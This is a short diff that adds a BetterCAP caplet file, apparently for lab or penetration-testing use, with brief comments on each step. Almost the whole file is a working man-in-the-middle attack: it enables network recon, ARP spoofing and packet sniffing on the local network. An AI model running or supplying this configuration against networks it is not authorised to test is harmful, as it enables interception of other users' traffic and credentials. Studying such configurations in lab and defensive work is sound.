@@ -1,0 +1,21 @@
+# cat mycaplet.cap
+
+# Show the BetterCAP Web UI in the browser:
+ui on
+
+# Disable verbose packet sniffing logs:
+set net.sniff.verbose false
+
+# Enable the network recon module:
+net.recon on
+
+# Instruct ARP spoofing to attempt to restore normal ARP tables 
+# when we stop ARP spoofing or exit BetterCAP:
+set arp.spoof.restore true
+
+# Enable ARP spoofing:
+arp.spoof on
+
+# Start packet sniffing:
+net.sniff on
+
